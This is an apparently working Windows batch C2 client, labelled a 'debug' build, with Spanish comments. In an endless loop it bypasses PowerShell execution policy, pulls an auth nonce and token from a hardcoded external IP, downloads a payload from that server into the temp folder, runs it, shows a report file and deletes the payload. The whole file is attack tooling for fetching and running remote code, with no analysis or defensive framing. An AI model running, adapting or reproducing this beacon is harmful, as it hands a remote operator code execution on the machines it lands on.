@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion
title C2 DEBUG MODE - %random%-%random%

:: ========================================
:: C2 CLIENT DEBUG - Windows BAT (VERBOSE)
:: IP REAL: 82.29.153.101:8080
:: ========================================
set "C2_SERVER=http://82.29.153.101:8080"
set "USER_ID=%random%-%random%"
set "SLEEP_TIME=10"
set "TEMP_PAYLOAD=%temp%\debug_payload_%USER_ID__.bat"

echo.
echo ╔══════════════════════════════════════╗
echo ║        C2 DEBUG MODE v1.0             ║
echo ║        ID: %USER_ID%                  ║
echo ║        Server: %C2_SERVER%            ║
echo ╚══════════════════════════════════════╝
echo.

:MAIN_LOOP
echo.
echo [%date% %time%] ================================
echo [%date% %time%] [DEBUG] INICIANDO CICLO
echo [%date% %time%] ================================

:: PASO 1: AUTH
echo [%date% %time%] [DEBUG] → PASO 1: Solicitando AUTH...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"Write-Host '[DEBUG] PowerShell AUTH ejecutándose...'; ^
$req = Invoke-WebRequest -Uri '%C2_SERVER%/auth/key' -UseBasicParsing -Verbose 2>&1; ^
Write-Host '[DEBUG] Respuesta HTTP recibida'; ^
$json = $req.Content ^| ConvertFrom-Json; ^
Write-Host ('[DEBUG] Nonce: ' + $json.nonce); ^
Write-Host ('[DEBUG] Token: ' + $json.token); ^
[Environment]::SetEnvironmentVariable('NONCE', $json.nonce, 'Process'); ^
[Environment]::SetEnvironmentVariable('TOKEN', $json.token, 'Process'); ^
[Console]::WriteLine('NONCE_OK=' + $json.nonce); ^
[Console]::WriteLine('TOKEN_OK=' + $json.token)" 

echo [%date% %time%] [DEBUG] ← Auth completado
echo [%date% %time%] [DEBUG] Nonce: %NONCE%
echo [%date% %time%] [DEBUG] Token: %TOKEN%
if not defined NONCE (
    echo [%date% %time%] [ERROR] Auth falló, reintentando...
    goto SLEEP_RETRY
)

:: PASO 2: PAYLOAD
echo.
echo [%date% %time%] [DEBUG] → PASO 2: Descargando PAYLOAD...
echo [%date% %time%] [DEBUG] Headers: X-Nonce=%NONCE% X-Token=%TOKEN%

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"Write-Host '[DEBUG] PowerShell PAYLOAD ejecutándose...'; ^
Write-Host ('[DEBUG] Enviando Nonce: ' + '${env:NONCE}'); ^
Write-Host ('[DEBUG] Enviando Token: ' + '${env:TOKEN}'); ^
$headers = @{ 'X-Nonce' = '${env:NONCE}'; 'X-Token' = '${env:TOKEN}' }; ^
Write-Host '[DEBUG] Headers preparados'; ^
try { ^
    Write-Host '[DEBUG] Request a /payload/encrypted...'; ^
    $resp = Invoke-WebRequest -Uri '%C2_SERVER%/payload/encrypted' -Headers $headers -UseBasicParsing; ^
    Write-Host ('[DEBUG] Status: ' + $resp.StatusCode); ^
    Write-Host ('[DEBUG] Content-Type: ' + $resp.Headers['Content-Type']); ^
    Write-Host ('[DEBUG] Content-Length: ' + $resp.Content.Length); ^
    Write-Host '[DEBUG] Contenido descargado:'; ^
    $resp.Content; ^
    Write-Host '[DEBUG] Guardando en temp...'; ^
    $resp.Content ^| Out-File -FilePath '%TEMP_PAYLOAD%' -Encoding UTF8; ^
    Write-Host ('[DEBUG] Archivo guardado: %TEMP_PAYLOAD%'); ^
    [Console]::WriteLine('PAYLOAD_OK=LISTO'); ^
} catch { ^
    Write-Host ('[ERROR] ' + $_.Exception.Message); ^
    exit 1 ^
}" 2>&1

if errorlevel 1 (
    echo [%date% %time%] [ERROR] Falló descarga payload
    goto SLEEP_RETRY
)

:: PASO 3: EJECUTAR PAYLOAD
echo.
echo [%date% %time%] [DEBUG] → PASO 3: Ejecutando payload...
echo [%date% %time%] [DEBUG] Archivo: %TEMP_PAYLOAD%
echo [%date% %time%] [DEBUG] CONTENIDO DEL PAYLOAD:
type "%TEMP_PAYLOAD%"
echo.
echo [%date% %time%] [DEBUG] ──────────────────────────
echo [%date% %time%] [DEBUG] 👇 EJECUTANDO PAYLOAD 👇
echo [%date% %time%] [DEBUG] ──────────────────────────
call "%TEMP_PAYLOAD%"
echo.
echo [%date% %time%] [DEBUG] ──────────────────────────
echo [%date% %time%] [DEBUG] ✅ Payload ejecutado
echo [%date% %time%] [DEBUG] Verificando reporte...
if exist "%temp%\c2_report.txt" (
    echo [%date% %time%] [INFO] 📄 REPORTE ENCONTRADO:
    type "%temp%\c2_report.txt"
    echo.
)

:: LIMPIEZA
del "%TEMP_PAYLOAD%" 2>nul
echo [%date% %time%] [DEBUG] 🧹 Limpieza completada

:SLEEP_RETRY
echo.
echo [%date% %time%] [DEBUG] ⏳ Esperando %SLEEP_TIME% segundos...
timeout /t %SLEEP_TIME% /nobreak
echo.
goto MAIN_LOOP